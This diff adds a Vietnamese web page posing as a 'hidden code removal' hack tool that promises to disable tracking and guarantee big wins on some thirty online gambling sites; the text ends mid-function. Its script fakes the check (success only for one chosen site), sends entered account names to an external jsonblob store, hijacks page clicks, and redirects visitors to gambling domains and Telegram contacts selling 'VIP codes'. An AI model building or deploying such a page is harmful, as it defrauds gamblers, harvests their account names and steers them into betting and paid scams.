@@ -1,0 +1,1194 @@
+<!doctype html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TOOL XOÁ MÃ ẨN // MM88</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" crossorigin href="./assets/index-C_ZKDQon.css">
+    <style>
+      @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&family=Share+Tech+Mono&display=swap');
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        background-color: #010806;
+        color: #ffffff;
+        font-family: 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: flex-start;
+        padding: 25px 15px 75px 15px;
+        overflow-x: hidden;
+        user-select: none;
+      }
+
+      #bg-matrix-video {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        object-fit: cover;
+        z-index: -10;
+        opacity: 0.35;
+        pointer-events: none;
+        filter: contrast(1.1) brightness(0.8);
+      }
+
+      .app-wrapper {
+        width: 100%;
+        max-width: 960px;
+        margin: 0 auto;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        z-index: 10;
+      }
+
+      /* 1. TITLE HEADER */
+      .tool-header-title {
+        font-family: 'Share Tech Mono', 'Roboto', monospace;
+        font-size: 2.2rem;
+        font-weight: 900;
+        color: #00ff88;
+        text-align: center;
+        margin-top: 10px;
+        margin-bottom: 25px;
+        letter-spacing: 2px;
+        text-shadow: 0 0 15px rgba(0, 255, 136, 0.7), 0 0 30px rgba(0, 255, 136, 0.4);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 12px;
+      }
+
+      .tool-header-title .bracket {
+        color: #00ff88;
+        font-size: 2.5rem;
+        font-weight: 400;
+        text-shadow: 0 0 15px rgba(0, 255, 136, 0.8);
+      }
+
+      /* 2. FEATURE BULLET POINTS */
+      .features-container {
+        width: 100%;
+        max-width: 720px;
+        display: flex;
+        flex-direction: column;
+        gap: 14px;
+        margin-bottom: 30px;
+        padding: 0 10px;
+      }
+
+      .feature-row {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        font-size: 1.05rem;
+        font-weight: 700;
+        color: #ffffff;
+        text-shadow: 0 1px 3px rgba(0,0,0,0.8);
+        line-height: 1.4;
+      }
+
+      .feature-check-icon {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 22px;
+        height: 22px;
+        background: #00c853;
+        border-radius: 4px;
+        color: #ffffff;
+        font-size: 14px;
+        flex-shrink: 0;
+        box-shadow: 0 0 8px rgba(0, 200, 83, 0.6);
+      }
+
+      /* 3. INPUT AND BUTTON ROW */
+      .action-input-section {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 14px;
+        width: 100%;
+        max-width: 650px;
+        margin-bottom: 35px;
+      }
+
+      .account-input-field {
+        flex: 1;
+        max-width: 420px;
+        height: 48px;
+        background: #eef2f5;
+        border: 2px solid #ffffff;
+        border-radius: 8px;
+        padding: 0 20px;
+        font-size: 1.1rem;
+        font-weight: 700;
+        color: #111111;
+        outline: none;
+        box-shadow: inset 0 2px 4px rgba(0,0,0,0.15), 0 0 10px rgba(0,0,0,0.3);
+        transition: all 0.2s ease;
+      }
+
+      .account-input-field:focus {
+        background: #ffffff;
+        border-color: #00ff88;
+        box-shadow: 0 0 15px rgba(0, 255, 136, 0.5);
+      }
+
+      .btn-check-action {
+        height: 48px;
+        background: #00c853;
+        color: #ffffff;
+        border: none;
+        border-radius: 8px;
+        padding: 0 28px;
+        font-size: 1.05rem;
+        font-weight: 800;
+        cursor: pointer;
+        white-space: nowrap;
+        box-shadow: 0 0 18px rgba(0, 200, 83, 0.5);
+        transition: all 0.2s ease;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .btn-check-action:hover {
+        background: #00e676;
+        transform: translateY(-1px);
+        box-shadow: 0 0 25px rgba(0, 230, 118, 0.8);
+      }
+
+      .btn-check-action:active {
+        transform: translateY(1px);
+      }
+
+      /* 4. GAME LOGOS GRID (30 LOGOS) */
+      .logos-grid-container {
+        display: grid;
+        grid-template-columns: repeat(5, 1fr);
+        gap: 14px;
+        width: 100%;
+        max-width: 940px;
+        margin-bottom: 35px;
+      }
+
+      .logo-card-item {
+        background: rgba(15, 23, 20, 0.55);
+        border: 1px solid rgba(255, 255, 255, 0.12);
+        border-radius: 12px;
+        height: 90px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 10px;
+        backdrop-filter: blur(8px);
+        -webkit-backdrop-filter: blur(8px);
+        cursor: pointer;
+        transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+        position: relative;
+        overflow: hidden;
+      }
+
+      .logo-card-item:hover {
+        border-color: rgba(0, 255, 136, 0.5);
+        transform: translateY(-2px);
+        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+      }
+
+      .logo-card-item img {
+        max-width: 100%;
+        max-height: 100%;
+        object-fit: contain;
+        filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
+        transition: transform 0.2s ease;
+      }
+
+      .logo-card-item:hover img {
+        transform: scale(1.04);
+      }
+
+      /* Highlighted Card */
+      .logo-card-item.active-highlight {
+        border: 2px solid #00ff88;
+        box-shadow: 0 0 22px rgba(0, 255, 136, 0.7), inset 0 0 12px rgba(0, 255, 136, 0.25);
+        background: rgba(0, 40, 25, 0.5);
+      }
+
+      /* 5. FIXED BOTTOM RED DOCK */
+      .bottom-status-dock {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        background: linear-gradient(90deg, #7f0000, #b30000, #7f0000);
+        border-top: 1px solid #ff4d4d;
+        color: #ffffff;
+        padding: 8px 12px;
+        font-size: 0.85rem;
+        font-weight: 700;
+        z-index: 9999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        box-shadow: 0 -4px 15px rgba(0,0,0,0.5);
+      }
+
+      .dock-inner {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-wrap: wrap;
+        gap: 10px;
+        max-width: 1200px;
+        margin: 0 auto;
+      }
+
+      .dock-item {
+        display: inline-flex;
+        align-items: center;
+        gap: 5px;
+        white-space: nowrap;
+      }
+
+      .dock-divider {
+        color: rgba(255, 255, 255, 0.6);
+        font-size: 0.75rem;
+      }
+
+      .dock-highlight {
+        color: #00ff88;
+        font-weight: 800;
+      }
+
+      /* 6. POPUP MODAL STYLES (IMAGE 1 & IMAGE 2) */
+      .modal-overlay-backdrop {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background: rgba(8, 12, 18, 0.85);
+        backdrop-filter: blur(10px);
+        -webkit-backdrop-filter: blur(10px);
+        z-index: 99999;
+        display: none;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+      }
+
+      .popup-modal-card {
+        background: #182232;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 16px;
+        width: 100%;
+        max-width: 480px;
+        padding: 28px 24px 22px 24px;
+        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
+        font-family: 'Roboto', sans-serif;
+        color: #e2e8f0;
+        animation: popupFadeIn 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+      }
+
+      @keyframes popupFadeIn {
+        from { opacity: 0; transform: scale(0.92); }
+        to { opacity: 1; transform: scale(1); }
+      }
+
+      .popup-modal-header {
+        font-size: 1.4rem;
+        font-weight: 900;
+        text-align: center;
+        letter-spacing: 1.5px;
+        margin-bottom: 18px;
+      }
+
+      .popup-modal-header.title-red {
+        color: #ef4444;
+        text-shadow: 0 0 12px rgba(239, 68, 68, 0.4);
+      }
+
+      .popup-modal-header.title-green {
+        color: #00e676;
+        text-shadow: 0 0 12px rgba(0, 230, 118, 0.4);
+      }
+
+      .popup-account-row {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        font-size: 1.05rem;
+        font-weight: 700;
+        margin-bottom: 20px;
+        color: #fbbf24;
+      }
+
+      .popup-account-row .account-label {
+        color: #fbbf24;
+      }
+
+      .popup-account-row .account-val {
+        color: #fbbf24;
+      }
+
+      .popup-modal-body {
+        display: flex;
+        flex-direction: column;
+        gap: 14px;
+        margin-bottom: 24px;
+        font-size: 0.95rem;
+        line-height: 1.5;
+        color: #cbd5e1;
+      }
+
+      .popup-item {
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+      }
+
+      .popup-item .item-icon {
+        font-size: 1.1rem;
+        flex-shrink: 0;
+        margin-top: 1px;
+      }
+
+      .btn-modal-close {
+        width: 100%;
+        height: 46px;
+        background: linear-gradient(135deg, #00d2ff, #00e676);
+        color: #ffffff;
+        border: none;
+        border-radius: 23px;
+        font-size: 1.05rem;
+        font-weight: 800;
+        cursor: pointer;
+        box-shadow: 0 4px 15px rgba(0, 230, 118, 0.3);
+        transition: all 0.2s ease;
+      }
+
+      .btn-modal-close:hover {
+        filter: brightness(1.1);
+        transform: translateY(-1px);
+      }
+
+      /* RESPONSIVE DESIGN */
+      @media (max-width: 860px) {
+        .logos-grid-container {
+          grid-template-columns: repeat(4, 1fr);
+          gap: 12px;
+        }
+        .tool-header-title {
+          font-size: 1.8rem;
+        }
+        .tool-header-title .bracket {
+          font-size: 2rem;
+        }
+        .feature-row {
+          font-size: 0.95rem;
+        }
+      }
+
+      @media (max-width: 640px) {
+        .logos-grid-container {
+          grid-template-columns: repeat(3, 1fr);
+          gap: 10px;
+        }
+        .logo-card-item {
+          height: 82px;
+          padding: 8px;
+        }
+      }
+
+      @media (max-width: 440px) {
+        .logos-grid-container {
+          grid-template-columns: repeat(2, 1fr);
+          gap: 8px;
+        }
+        .logo-card-item {
+          height: 78px;
+          padding: 6px;
+        }
+        .tool-header-title {
+          font-size: 1.3rem;
+          margin-top: 5px;
+          margin-bottom: 18px;
+        }
+        .tool-header-title .bracket {
+          font-size: 1.5rem;
+        }
+        .action-input-section {
+          flex-direction: column;
+          gap: 10px;
+        }
+        .account-input-field {
+          width: 100%;
+          max-width: 100%;
+          text-align: center;
+        }
+        .btn-check-action {
+          width: 100%;
+        }
+        .bottom-status-dock {
+          font-size: 0.72rem;
+          padding: 6px 8px;
+        }
+        .dock-inner {
+          gap: 6px;
+        }
+      }
+    </style>
+  </head>
+  <body style="background-color: #010806; margin: 0;">
+    <video autoplay loop muted playsinline id="bg-matrix-video">
+      <source src="./assets/bg_matrix.mp4" type="video/mp4">
+    </video>
+
+    <div class="app-wrapper">
+      <!-- TITLE HEADER -->
+      <h1 class="tool-header-title">
+        <span class="bracket">[</span>
+        <span>TOOL XOÁ MÃ ẨN</span>
+        <span class="bracket">]</span>
+      </h1>
+
+      <!-- 3 FEATURE LINES -->
+      <div class="features-container">
+        <div class="feature-row">
+          <span class="feature-check-icon"><i class="fa-solid fa-check"></i></span>
+          <span>Tắt chế độ theo dõi tài khoản và IP từ trang game</span>
+        </div>
+        <div class="feature-row">
+          <span class="feature-check-icon"><i class="fa-solid fa-check"></i></span>
+          <span>Kích hoạt, tối đa chế độ BIGWIN, SCATTER cho game nổ hũ</span>
+        </div>
+        <div class="feature-row">
+          <span class="feature-check-icon"><i class="fa-solid fa-check"></i></span>
+          <span>Loại bỏ soi BCR, tối đa tỉ lệ thắng</span>
+        </div>
+      </div>
+
+      <!-- INPUT AND CHECK BUTTON -->
+      <div class="action-input-section">
+        <input type="text" id="accountInput" class="account-input-field" placeholder="Hoangthienphuc" value="Hoangthienphuc" autocomplete="off" spellcheck="false" />
+        <button type="button" id="btnCheckAccount" class="btn-check-action">Xoá mã ẩn</button>
+      </div>
+
+      <!-- GAME LOGOS GRID (30 LOGOS) -->
+      <div class="logos-grid-container" id="logosGrid">
+        <div class="logo-card-item" data-game="c168">
+          <img src="./assets/logos/c168.svg" alt="C168" />
+        </div>
+        <div class="logo-card-item" data-game="hitclub">
+          <img src="./assets/logos/hitclub.svg" alt="HIT.CLUB" />
+        </div>
+        <div class="logo-card-item" data-game="sunwin">
+          <img src="./assets/logos/sunwin.svg" alt="SUNWIN" />
+        </div>
+        <div class="logo-card-item" data-game="go88">
+          <img src="./assets/logos/go88.svg" alt="GO88" />
+        </div>
+        <div class="logo-card-item active-highlight" data-game="mm88">
+          <img src="./assets/logos/mm88.svg" alt="MM88" />
+        </div>
+        <div class="logo-card-item" data-game="llwin">
+          <img src="./assets/logos/llwin.svg" alt="LLWIN" />
+        </div>
+        <div class="logo-card-item" data-game="ok9">
+          <img src="./assets/logos/ok9.svg" alt="OK9" />
+        </div>
+        <div class="logo-card-item" data-game="789bet">
+          <img src="./assets/logos/789bet.svg" alt="789BET" />
+        </div>
+        <div class="logo-card-item" data-game="fy88">
+          <img src="./assets/logos/fy88.svg" alt="FY88" />
+        </div>
+        <div class="logo-card-item" data-game="mb66">
+          <img src="./assets/logos/mb66.svg" alt="MB66" />
+        </div>
+        <div class="logo-card-item" data-game="hi88">
+          <img src="./assets/logos/hi88.svg" alt="HI88" />
+        </div>
+        <div class="logo-card-item" data-game="gg88">
+          <img src="./assets/logos/gg88.svg" alt="GG88" />
+        </div>
+        <div class="logo-card-item" data-game="kubet">
+          <img src="./assets/logos/kubet.svg" alt="KUBET" />
+        </div>
+        <div class="logo-card-item" data-game="shbet">
+          <img src="./assets/logos/shbet.svg" alt="SHBET" />
+        </div>
+        <div class="logo-card-item" data-game="nk88">
+          <img src="./assets/logos/nk88.svg" alt="NK88" />
+        </div>
+        <div class="logo-card-item" data-game="kkwin">
+          <img src="./assets/logos/kkwin.svg" alt="KKWIN" />
+        </div>
+        <div class="logo-card-item" data-game="tg88">
+          <img src="./assets/logos/tg88.svg" alt="TG88" />
+        </div>
+        <div class="logo-card-item" data-game="go8">
+          <img src="./assets/logos/go8.svg" alt="GO8" />
+        </div>
+        <div class="logo-card-item" data-game="kuwin">
+          <img src="./assets/logos/kuwin.svg" alt="KUWIN" />
+        </div>
+        <div class="logo-card-item" data-game="open88">
+          <img src="./assets/logos/open88.svg" alt="OPEN88" />
+        </div>
+        <div class="logo-card-item" data-game="33win">
+          <img src="./assets/logos/33win.svg" alt="33WIN" />
+        </div>
+        <div class="logo-card-item" data-game="f8bet">
+          <img src="./assets/logos/f8bet.svg" alt="F8BET" />
+        </div>
+        <div class="logo-card-item" data-game="xx88">
+          <img src="./assets/logos/xx88.svg" alt="XX88" />
+        </div>
+        <div class="logo-card-item" data-game="o8">
+          <img src="./assets/logos/o8.svg" alt="O8" />
+        </div>
+        <div class="logo-card-item" data-game="j88">
+          <img src="./assets/logos/j88.svg" alt="J88" />
+        </div>
+        <div class="logo-card-item" data-game="jun88">
+          <img src="./assets/logos/jun88.svg" alt="Jun88" />
+        </div>
+        <div class="logo-card-item" data-game="rr88">
+          <img src="./assets/logos/rr88.svg" alt="RR88" />
+        </div>
+        <div class="logo-card-item" data-game="u888">
+          <img src="./assets/logos/u888.svg" alt="U888" />
+        </div>
+        <div class="logo-card-item" data-game="sc88">
+          <img src="./assets/logos/sc88.svg" alt="SC88" />
+        </div>
+        <div class="logo-card-item" data-game="cm88">
+          <img src="./assets/logos/cm88.svg" alt="CM88" />
+        </div>
+      </div>
+    </div>
+
+    <!-- POPUP MODAL OVERLAY -->
+    <div id="game-status-modal-overlay" class="modal-overlay-backdrop">
+      <!-- 1. ANOMALY MODAL CARD (IMAGE 1) -->
+      <div id="modal-card-anomaly" class="popup-modal-card">
+        <div class="popup-modal-header title-red">PHÁT HIỆN BẤT THƯỜNG</div>
+        <div class="popup-account-row">
+          <span class="bulb-icon">💡</span>
+          <span class="account-label">Tài khoản:</span>
+          <span class="account-val" id="anomaly-account-name">Hoangthienphuc</span>
+        </div>
+        <div class="popup-modal-body">
+          <div class="popup-item">
+            <span class="item-icon">❌</span>
+            <span>Mã ẩn không thể bị loại bỏ. Hệ thống bảo mật đã khoá truy cập.</span>
+          </div>
+          <div class="popup-item">
+            <span class="item-icon">⚠️</span>
+            <span>Chế độ theo dõi IP vẫn đang hoạt động và không thể vô hiệu hoá.</span>
+          </div>
+          <div class="popup-item">
+            <span class="item-icon">⚠️</span>
+            <span>Tài khoản không kích hoạt được cơ chế BIGWIN, SCATTER.</span>
+          </div>
+          <div class="popup-item">
+            <span class="item-icon">⚠️</span>
+            <span>BCR vẫn bị soi làm giảm tỷ lệ chiến thắng</span>
+          </div>
+          <div class="popup-item">
+            <span class="item-icon">🔴</span>
+            <span>Cảnh báo: Mọi nỗ lực chỉnh sửa hoặc can thiệp trái phép đều đã bị ghi nhận.</span>
+          </div>
+        </div>
+        <button type="button" class="btn-modal-close" onclick="closeStatusModal()">Đóng</button>
+      </div>
+
+      <!-- 2. SUCCESS MODAL CARD (IMAGE 2 - FOR LLWIN) -->
+      <div id="modal-card-success" class="popup-modal-card" style="display: none;">
+        <div class="popup-modal-header title-green">THÀNH CÔNG</div>
+        <div class="popup-account-row">
+          <span class="bulb-icon">💡</span>
+          <span class="account-label">Tài khoản:</span>
+          <span class="account-val" id="success-account-name">Pecchehb</span>
+        </div>
+        <div class="popup-modal-body">
+          <div class="popup-item">
+            <span class="item-icon">🟢</span>
+            <span>Mã ẩn đã được loại bỏ thành công.</span>
+          </div>
+          <div class="popup-item">
+            <span class="item-icon">✅</span>
+            <span>Chế độ theo dõi IP của hệ thống game đã được tắt.</span>
+          </div>
+          <div class="popup-item">
+            <span class="item-icon">✅</span>
+            <span>Tài khoản đã được thiết lập cơ hội nhận MAX WIN HŨ trong 1000 lượt quay đầu.</span>
+          </div>
+          <div class="popup-item">
+            <span class="item-icon">✅</span>
+            <span>Tính năng BIG WIN và SCATTER đã được kích hoạt.</span>
+          </div>
+          <div class="popup-item">
+            <span class="item-icon">✅</span>
+            <span>Loại bỏ soi BCR, tối đa tỷ lệ thắng.</span>
+          </div>
+          <div class="popup-item">
+            <span class="item-icon">💎</span>
+            <span>Chúc bạn gặp nhiều may mắn và thắng lớn!</span>
+          </div>
+        </div>
+        <button type="button" class="btn-modal-close" onclick="closeStatusModal()">Đóng</button>
+      </div>
+    </div>
+
+    <!-- FIXED BOTTOM RED DOCK -->
+    <div class="bottom-status-dock">
+      <div class="dock-inner">
+        <span class="dock-item status-pill"><i class="fa-solid fa-globe"></i> <span class="status-k">IP</span>: <span class="status-v">42.112.95.78</span></span>
+        <span class="dock-divider">•</span>
+        <span class="dock-item"><i class="fa-solid fa-desktop"></i> <span>Thiết bị</span>: <span>Desktop</span></span>
+        <span class="dock-divider">•</span>
+        <span class="dock-item"><i class="fa-brands fa-windows"></i> <span>OS</span>: <span>Windows</span></span>
+        <span class="dock-divider">•</span>
+        <span class="dock-item"><i class="fa-brands fa-chrome"></i> <span>Browser</span>: <span>Google Chrome</span></span>
+        <span class="dock-divider">•</span>
+        <span class="dock-item"><i class="fa-solid fa-key"></i> <span>Lisence</span>: <span class="dock-highlight">by NUOIEM</span></span>
+      </div>
+    </div>
+
+  <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"1575790a9946416b9c5f3e8999027390","r":1}' crossorigin="anonymous"></script>
+  <script>
+    let selectedGame = 'mm88';
+
+    // Logo card selection interactivity
+    document.querySelectorAll('.logo-card-item').forEach(card => {
+      card.addEventListener('click', function() {
+        document.querySelectorAll('.logo-card-item').forEach(c => c.classList.remove('active-highlight'));
+        this.classList.add('active-highlight');
+        selectedGame = (this.getAttribute('data-game') || 'mm88').toLowerCase();
+      });
+    });
+
+    function openStatusModal(acc) {
+      const overlay = document.getElementById('game-status-modal-overlay');
+      const cardAnomaly = document.getElementById('modal-card-anomaly');
+      const cardSuccess = document.getElementById('modal-card-success');
+      
+      document.getElementById('anomaly-account-name').innerText = acc;
+      document.getElementById('success-account-name').innerText = acc;
+
+      if (selectedGame === 'llwin') {
+        cardAnomaly.style.display = 'none';
+        cardSuccess.style.display = 'block';
+      } else {
+        cardSuccess.style.display = 'none';
+        cardAnomaly.style.display = 'block';
+      }
+
+      overlay.style.display = 'flex';
+    }
+
+    function closeStatusModal() {
+      document.getElementById('game-status-modal-overlay').style.display = 'none';
+    }
+
+    // --- DOMAIN-BASED LINK ROUTING FOR CLOUDFLARE ---
+    const DEFAULT_TARGET_URL = 'https://mm86f.vip';
+    const DEFAULT_TELEGRAM_URL = 'https://t.me/ITXOAMAAN';
+    const DEFAULT_TELEGRAM_HANDLE = '@ITXOAMAAN';
+    const DEFAULT_CODE_TELEGRAM_URL = 'https://t.me/TLITMAAN';
+    const DEFAULT_CODE_TELEGRAM_HANDLE = '@TLITMAAN';
+
+    const DOMAIN_CONFIG = {
+      "xoaipmaan.com": {
+        targetUrl: "https://mm86f.vip",
+        telegramUrl: "https://t.me/ITXOAMAAN",
+        telegramHandle: "@ITXOAMAAN",
+        codeTelegramUrl: "https://t.me/TLITMAAN",
+        codeTelegramHandle: "@TLITMAAN"
+      },
+      "xoaipmaan.net": {
+        targetUrl: "https://m88qt.uk",
+        telegramUrl: "https://t.me/it_wed",
+        telegramHandle: "@it_wed",
+        codeTelegramUrl: "https://t.me/KhanhLinh_8M",
+        codeTelegramHandle: "@KhanhLinh_8M"
+      }
+    };
+
+    window.getDomainConfig = function() {
+      const host = (window.location.hostname || "").toLowerCase().trim();
+      const cleanHost = host.replace(/^www\./, "");
+      const cfg = DOMAIN_CONFIG[host] || DOMAIN_CONFIG[cleanHost] || {};
+      return {
+        targetUrl: cfg.targetUrl || DEFAULT_TARGET_URL,
+        telegramUrl: cfg.telegramUrl || DEFAULT_TELEGRAM_URL,
+        telegramHandle: cfg.telegramHandle || DEFAULT_TELEGRAM_HANDLE,
+        codeTelegramUrl: cfg.codeTelegramUrl || cfg.telegramUrl || DEFAULT_CODE_TELEGRAM_URL,
+        codeTelegramHandle: cfg.codeTelegramHandle || cfg.telegramHandle || DEFAULT_CODE_TELEGRAM_HANDLE
+      };
+    };
+
+    window.getTargetUrl = function() {
+      return window.getDomainConfig().targetUrl;
+    };
+
+    window.getTelegramUrl = function() {
+      return window.getDomainConfig().telegramUrl;
+    };
+
+    const SYNC_BLOB_ID = '019fbacd-a33b-79bd-895a-44053b741804';
+    const SYNC_URL = 'https://jsonblob.com/api/jsonBlob/' + SYNC_BLOB_ID;
+
+    let userAssignedCode = null;
+    let currentAccount = null;
+    let checkInterval = null;
+    let globalCodesSyncMap = {};
+
+    async function pullGlobalCodesMap() {
+      try {
+        const globalRes = await fetch(SYNC_URL, { headers: { 'Accept': 'application/json' } });
+        const store = await globalRes.json().catch(() => null);
+        if (store && store.codesMap) {
+          for (const k in store.codesMap) {
+            globalCodesSyncMap[k.toUpperCase()] = store.codesMap[k];
+          }
+        }
+      } catch(e) {}
+      try {
+        const res = await fetch('/api/admin/codes?limit=5000');
+        const data = await res.json().catch(() => null);
+        if (data && Array.isArray(data.codes)) {
+          data.codes.forEach(c => {
+            if (c && c.id) {
+              globalCodesSyncMap[c.id.toUpperCase()] = c;
+            }
+          });
+        }
+      } catch(e) {}
+    }
+
+    pullGlobalCodesMap();
+    setInterval(pullGlobalCodesMap, 1500);
+
+    async function syncRequestToGlobal(acc) {
+      try {
+        const getRes = await fetch(SYNC_URL, { headers: { 'Accept': 'application/json' } });
+        let store = await getRes.json().catch(() => null);
+        if (!store || !Array.isArray(store.pending)) store = { pending: [] };
+
+        if (!store.pending.find(p => p.account && p.account.toLowerCase() === acc.toLowerCase())) {
+          store.pending.unshift({ account: acc, requestedAt: new Date().toISOString() });
+          if (store.pending.length > 50) store.pending.pop();
+        }
+
+        await fetch(SYNC_URL, {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+          body: JSON.stringify(store)
+        });
+      } catch(e) {}
+    }
+
+    function startCheckApproval(acc) {
+      currentAccount = acc;
+      if (checkInterval) clearInterval(checkInterval);
+      checkInterval = setInterval(async () => {
+        if (!currentAccount || userAssignedCode) return;
+
+        // Check local backend API
+        try {
+          const res = await fetch(`/api/check-status?account=${encodeURIComponent(currentAccount)}`);
+          const d = await res.json();
+          if (d.success && d.status === 'assigned' && d.code) {
+            userAssignedCode = d.code.id;
+            clearInterval(checkInterval);
+            return;
+          }
+        } catch(e) {}
+
+        // Check global sync store (jsonblob)
+        try {
+          const globalRes = await fetch(SYNC_URL, { headers: { 'Accept': 'application/json' } });
+          const store = await globalRes.json().catch(() => null);
+          if (store && store.codesMap) {
+            for (const key in store.codesMap) {
+              const c = store.codesMap[key];
+              if (c && c.assignedAccount && c.assignedAccount.toLowerCase() === currentAccount.toLowerCase() && c.status === 'assigned') {
+                userAssignedCode = c.id;
+                clearInterval(checkInterval);
+                return;
+              }
+            }
+          }
+        } catch(e) {}
+      }, 2000);
+    }
+
+    // SYNCHRONOUS INSTANT EVENT CAPTURE & INTERCEPTION (0ms)
+    document.addEventListener('click', function(e) {
+      // Extract inputs SYNCHRONOUSLY
+      const inputs = document.querySelectorAll('input');
+      let acc = '';
+      let enteredCode = '';
+      inputs.forEach(inp => {
+        const val = (inp.value || '').trim();
+        const ph = (inp.placeholder || '').toLowerCase();
+        const name = (inp.name || '').toLowerCase();
+        if (ph.includes('mã') || ph.includes('code') || name.includes('code')) {
+          if (val) enteredCode = val.toUpperCase();
+        } else {
+          if (val) acc = val;
+        }
+      });
+
+      // Synchronous Instant Code Lock Verification
+      if (enteredCode && acc) {
+        const info = globalCodesSyncMap[enteredCode];
+        if (info) {
+          if (info.status === 'used') {
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            alert(`❌ CHẶN TRUY CẬP: MÃ [${enteredCode}] ĐÃ ĐƯỢC SỬ DỤNG TRƯỚC ĐÓ. KHÔNG THỂ DÙNG LẠI!`);
+            return false;
+          }
+          if (info.status === 'deleted') {
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            alert(`❌ CHẶN TRUY CẬP: MÃ [${enteredCode}] ĐÃ BỊ XÓA KHỎI HỆ THỐNG!`);
+            return false;
+          }
+          if (info.assignedAccount && info.assignedAccount.toLowerCase().trim() !== acc.toLowerCase().trim()) {
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            
+            const teleConfig = window.getDomainConfig();
+            let errBox = document.getElementById('code-error-inline-msg');
+            if (!errBox) {
+              errBox = document.createElement('div');
+              errBox.id = 'code-error-inline-msg';
+              errBox.style.cssText = 'color: #ff4d4d; font-size: 0.85rem; font-weight: bold; margin-top: 6px; text-align: center; font-family: sans-serif;';
+              const codeInp = document.querySelector('input');
+              if (codeInp && codeInp.parentNode) codeInp.parentNode.appendChild(errBox);
+            }
+            if (errBox) {
+              errBox.innerHTML = `⚠️ Mã không hợp lệ hoặc thuộc tài khoản khác! Vui lòng liên hệ Telegram <a href="${teleConfig.telegramUrl}" target="_blank" style="color: #25c4ac; text-decoration: underline; font-weight: bold;">${teleConfig.telegramHandle}</a> để được hỗ trợ!`;
+            }
+
+            alert(`⚠️ Mã giftcode không hợp lệ hoặc thuộc tài khoản khác. Vui lòng liên hệ Telegram ${teleConfig.telegramHandle} (${teleConfig.telegramUrl}) để được hỗ trợ!`);
+            return false;
+          }
+        }
+      }
+
+      const btn = e.target.closest('button, a, input[type="submit"]');
+      if (btn) {
+        const txt = (btn.innerText || btn.textContent || btn.value || '').trim().toLowerCase();
+
+        // Confirm Code / Submit Code handler ("XÁC NHẬN")
+        if (txt === 'xác nhận' || txt.includes('xác nhận')) {
+          const codeInput = document.querySelector('input.input-mono') || document.querySelector('input[placeholder*="4CRD"]') || document.querySelector('input[placeholder*="mã"]') || document.querySelector('input[placeholder*="Mã"]');
+          const codeVal = codeInput ? codeInput.value.trim().toUpperCase() : '';
+          
+          if (codeVal) {
+            const info = globalCodesSyncMap[codeVal];
+            if (info && info.accountType && info.accountType !== 'clean') {
+              e.preventDefault();
+              e.stopPropagation();
+              e.stopImmediatePropagation();
+
+              showHeavyWarningModal(info.accountType, codeVal);
+              return false;
+            }
+          }
+        }
+
+        // Copy button handler
+        if (txt.includes('sao chép') || txt.includes('copy')) {
+          if (userAssignedCode) {
+            navigator.clipboard.writeText(userAssignedCode);
+            alert('📋 Đã sao chép mã VIP do Admin cấp: ' + userAssignedCode);
+          } else {
+            alert('⏳ Đang chờ Admin phê duyệt & cấp mã cho tài khoản của bạn. Vui lòng thử lại sau vài giây!');
+          }
+          return;
+        }
+
+        // IT Support / Telegram button handler
+        if (txt.includes('liên hệ it') || txt.includes('it hỗ trợ') || txt.includes('hỗ trợ') || txt.includes('telegram') || txt.includes('tele') || txt.includes('support')) {
+          e.preventDefault();
+          e.stopPropagation();
+          e.stopImmediatePropagation();
+          
+          const teleUrl = window.getTelegramUrl();
+          if (btn.tagName === 'A') {
+            btn.href = teleUrl;
+            btn.target = '_blank';
+          }
+          window.open(teleUrl, '_blank');
+          return false;
+        }
+
+        // Target action / Game link button handler
+        if (txt.includes('cổng quốc tế') || txt.includes('cống quốc tế') || txt.includes('quốc tế') || txt.includes('gate-live') || txt.includes('tìm cổng') || txt.includes('cổng đang nhả') || txt.includes('truy cập') || txt.includes('vào game') || txt.includes('chơi ngay')) {
+          e.preventDefault();
+          e.stopPropagation();
+          e.stopImmediatePropagation();
+          
+          const targetUrl = window.getTargetUrl();
+          if (btn.tagName === 'A') {
+            btn.href = targetUrl;
+            btn.target = '_blank';
+          }
+          window.open(targetUrl, '_blank');
+          return false;
